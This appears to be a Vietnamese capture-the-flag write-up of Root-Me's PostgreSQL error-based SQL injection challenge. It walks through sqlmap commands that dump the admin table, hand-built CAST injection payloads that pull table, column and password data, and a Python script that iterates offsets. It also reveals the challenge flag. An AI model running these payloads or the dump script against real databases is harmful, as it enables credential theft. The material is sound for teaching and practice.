# SQL-Error

**Point: 40**

**Exploiting SQL error**

**Statement: Retrieve administrator’s password.**

**Related ressources:**

[Khai thác Error based SQL injection](https://whitehat.vn/threads/sql-injection-khai-thac-error-based-sql-injection.5664/)

[Error Based Injection](https://sqlwiki.netspi.com/injectionTypes/errorBased/#postgresql)

[SQL Payload List](https://github.com/payloadbox/sql-injection-payload-list)

[Information schema](https://www.postgresql.org/docs/9.1/information-schema.html#:~:text=The%20information%20schema%20consists%20of,defined%20in%20the%20current%20database.&text=Some%20other%20views%20have%20similar,%2C%20constraint_column_usage%2C%20constraint_table_usage%2C%20table_constraints)

# Overview:

![image](https://user-images.githubusercontent.com/115911041/234256771-e502129c-1539-482d-b6e4-db8d0932b92a.png)

Form của challenge. Lần này challenge cung cấp cho ta 2 mục `Authentication` và `Contents`. Ban đầu thấy mục `Authentication` có chức năng Login, mình đã thử fuzz nhưng kết quả cho ra là `login failed`. Mình chuyển sang mục `Contents`

![image](https://user-images.githubusercontent.com/115911041/234257979-f60dad57-c246-40dc-9e5a-94aa89169ae0.png)

Nhận thấy URL có thay đổi. Thấy xuất hiện `order` và `ASC`, nghĩa là ở đây đang sử dụng lệnh `order by` và `ASC` là sắp sếp theo thứ tự tăng dần. Mình sẽ thử fuzz 

![image](https://user-images.githubusercontent.com/115911041/234265663-6536c738-9b3c-4d26-af47-322c912aad32.png)

Ban đầu là thêm dấu nháy `'` thì có lỗi báo giống như dự đoán là  đang sử dụng `order by` theo cột page và `ERROR: syntax error at or near "''"` nghĩa là database đang chạy là PostgreSQL.

Vậy đối với challenge này ta dùng Error-Based Blind SQL Injection. Phương thức này là cơ bản là một phương thức mà câu truy vấn của mình sẽ khiến server trả về thông báo lỗi, từ thông báo lỗi đó có thể chứa nội dung truy vấn hoặc các thông tin của cơ sở dữ liệu để chúng ta có thể khai thác xa hơn.

Đối với PostgreSQL thì chỉ có 1 lỗi ta có thể khai thác SQL injection - `đổi kiểu dữ liệu từ dạng chuỗi sang dạng số`- `INT`. Ta có 2 hàm sử dụng là `Cast()` và `Convert`
đối với PostgreSQL thì ta sử dụng `Cast()`

Một cách khác nữa là ta sử dụng SQL map

# Solution:

# Cách 1:

Sử dụng câu lệnh sau

`python sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC" --dbs` 

![image](https://user-images.githubusercontent.com/115911041/234262375-2723de88-19fb-49fc-a8b6-a86762c871dd.png)

Kết quả trả về cho ta thấy bài này xuất hiện 2 cách khai thác sqli bao gồm khai khác blind và error. Có 3 database trả về, tuy nhiên ta chỉ cần chú ý đến database public là được. Thực hiện lấy các tables trên database này

`python sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC" -D public --tables`

`-D public` là lấy kết quả trong `database public` còn `--tables` sử dụng để lấy tên các bảng.

![image](https://user-images.githubusercontent.com/115911041/234263135-d1a7ceb6-2218-4a4e-95de-126a678f2f07.png)


Kết quả cho ra table là  `m3mbr35t4bl3`. Thực hiện lấy data trong table

`python sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC" -D public -T m3mbr35t4bl3 --dump`

`-T` là bảng cần lấy data, `--dump` lầy toàn bộ dữ liệu.

![image](https://user-images.githubusercontent.com/115911041/234263711-6ac5cf8d-5db7-4525-a3ed-1784cb72e91b.png)

Kết quả cho ra 1 hàng dữ liệu của admin `Flag: 1a2BdKT5DIx3qxQN3UaC`

# Cách 2:

Ta nhớ lại là với mỗi câu truy vấn lỗi thì ta đều sẽ nhận được thông báo lỗi từ server. Và trong tài liệu mình đọc thì có một cách để khai thác lỗi này đó và dựa vào những câu lệnh ép kiểu.

Ép kiểu trong sql thì cũng giống như ép kiểu trong lập trình vậy. Nó sẽ chuyển kiểu dữ liệu của một biến hay một giá trị từ kiểu này sang kiểu khác. Nhưng mà hai kiểu này phải tương đồng với nhau. Ví dụ như từ int sang float , float sang int, … chứ không thể chuyển từ string mà chuyển qua int hay float được.

Những payload hay tên của table mình có tham khảo ở mục số (2) và (3) mà mình đã cung cấp ở `related resources`.

Bây giờ ta sẽ chèn payload như sau

`,cast(chr(126)||(select+table_name+from+information_schema.tables+limit+1,1)||chr(126)+as+numeric)--`

![image](https://user-images.githubusercontent.com/115911041/234294290-692d4acd-8d04-40dd-a01e-c6931c26ef59.png)

Nó gợi ý mình sài LIMIT kèm với OFFSET mới được.Mình sẽ thử `limit 1 offset 0`

`,cast(chr(126)||((select+table_name+from information_schema.tables+limit+1+offset+0)||chr(126))+as+numeric)--`

![image](https://user-images.githubusercontent.com/115911041/234301011-642de513-135b-4063-9aba-255799657659.png)

Bây giờ ta sẽ khai thác tên cột bằng cách chèn payload

`,cast(chr(126)||((select+column_name+from+information_schema.columns+limit+1+offset+0)||chr(126))+as+numeric)--`

![image](https://user-images.githubusercontent.com/115911041/234286649-cc9bba23-05fa-4f0c-a07e-dbc78ecb4760.png)

Mình để offset là 0 thì có result là `id`. Tiếp theo dùng Burp Intruder để cho off set chạy

![image](https://user-images.githubusercontent.com/115911041/234287538-dceda6c1-2290-4657-a653-f00c8e725251.png)

![image](https://user-images.githubusercontent.com/115911041/234288018-5cb4fd01-7a5e-4193-9bd6-8b915a791d4f.png)

May là offset ở vị trí 1 và 2 `us3rn4m3_c0l` và `p455w0rd_c0l`.Bây giờ mình sẽ khai thác dữ liệu của 2 cột

`,cast(chr(126)||(select us3rn4m3_c0l from m3mbr35t4bl3 limit 1 offset 0) as numeric)–-`

`,cast(chr(126)||(select p455w0rd_c0l from m3mbr35t4bl3 limit 1 offset 0) as numeric)--`

![image](https://user-images.githubusercontent.com/115911041/234288968-48b0f50d-5b60-43f4-a1cd-076c9315b625.png)

*Bonus:

Khi mà các bạn tìm được `table_name` á, thay vì ta sẽ chạy offset để tìm `column_name` bằng burp intruder ta có thể coding một chút 

```
import requests
import sys

URL='http://challenge01.root-me.org/web-serveur/ch34/'
for i in range(0, 1001):
    query = 'ASC, (CAST((select column_name from information_schema.columns limit 1 offset ' + str(i) + ') as int))--'
    params = {'action': 'contents', 'order': query}
    http = requests.get(url= URL, params =params)
    content = http.content.decode("utf-8")
    print(content[400:])
```    

OUTPUT:
![image](https://user-images.githubusercontent.com/115911041/234318522-d10ca3c5-04e4-414c-986b-548e6b8e83c8.png)

Kết quả cho ra 2 column `us3rn4m3_c0l` và `p455w0rd_c0l`. Thông thường thì username sẽ tương ứng với mật khẩu. Giờ ta sẽ các user trong column `us3rn4m3_c0l`  và idnex tương ứng, sau đó lấy index tương ứng để gửi query bên `p455w0rd_c0l`.

![image](https://user-images.githubusercontent.com/115911041/234322283-a3090d6b-7863-4b00-b4b2-2df35cc493a2.png)

Ta thấy admin ứng với `0`. Thì nó khá giống với cái cách mà ta offset ở trên `offset 0`. Còn không các bạn có thể làm kiểu này lun cho nó ngầu :))))

![image](https://user-images.githubusercontent.com/115911041/234322915-5f091479-f343-4a40-b15a-fca4b4a4346b.png)

Ra password lun, tương ứng vị trí `admin` khi mà ta quét user ở column `us3rn4m3_c0l`.




